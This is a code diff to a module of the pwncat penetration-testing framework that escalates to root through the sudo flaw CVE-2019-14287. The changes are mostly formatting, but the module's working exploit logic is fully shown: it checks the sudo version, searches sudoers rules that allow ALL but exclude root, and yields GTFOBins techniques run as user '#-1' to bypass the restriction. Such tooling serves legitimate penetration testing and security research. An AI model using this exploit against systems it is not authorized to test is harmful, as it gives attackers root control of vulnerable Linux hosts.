@@ -11,6 +11,7 @@ from pwncat.modules.escalate import (
 
 from packaging import version
 
+
 class Module(EscalateModule):
     """
     Escalate to root using CVE-2019-14287 sudo vulnerability.
@@ -19,20 +20,22 @@ class Module(EscalateModule):
     def enumerate(self):
         """ Enumerate SUDO vulnerability """
 
-        sudo_fixed_version = '1.8.28'
+        sudo_fixed_version = "1.8.28"
 
-        try:
-            # Check the sudo version number
-            sudo_version = pwncat.victim.enumerate.first("system.sudo_version")
-        except FileNotFoundError:
-            return
+        for fact in pwncat.modules.run(
+            "enumerate.sudo_version", progress=self.progress
+        ):
+            sudo_version = fact
+            break
 
-        if version.parse(sudo_version.data.version) >= version.parse(sudo_fixed_version):
+        if version.parse(sudo_version.data.version) >= version.parse(
+            sudo_fixed_version
+        ):
             # Patched version, no need to check privs
             return
 
         rules = []
-        for fact in pwncat.modules.run("enumerate.sudoers"):
+        for fact in pwncat.modules.run("enumerate.sudoers", progress=self.progress):
 
             # Doesn't appear to be a user specification
             if not fact.data.matched:
@@ -60,13 +63,17 @@ class Module(EscalateModule):
             rules.append(fact.data)
 
         for rule in rules:
-            userlist = [x.strip() for x in rule.runas_user.split(',')]
+            userlist = [x.strip() for x in rule.runas_user.split(",")]
             if "ALL" in userlist and "!root" in userlist:
                 for command in rule.commands:
                     for method in pwncat.victim.gtfo.iter_sudo(
                         command, caps=Capability.ALL
                     ):
-                        yield GTFOTechnique("root", self, method, user="\\#-1", spec=command)
+                        yield GTFOTechnique(
+                            "root", self, method, user="\\#-1", spec=command
+                        )
 
     def human_name(self, tech: "Technique"):
-        return f"[cyan]{tech.method.binary_path}[/cyan] ([red]sudo CVE-2019-14287[/red])"
+        return (
+            f"[cyan]{tech.method.binary_path}[/cyan] ([red]sudo CVE-2019-14287[/red])"
+        )
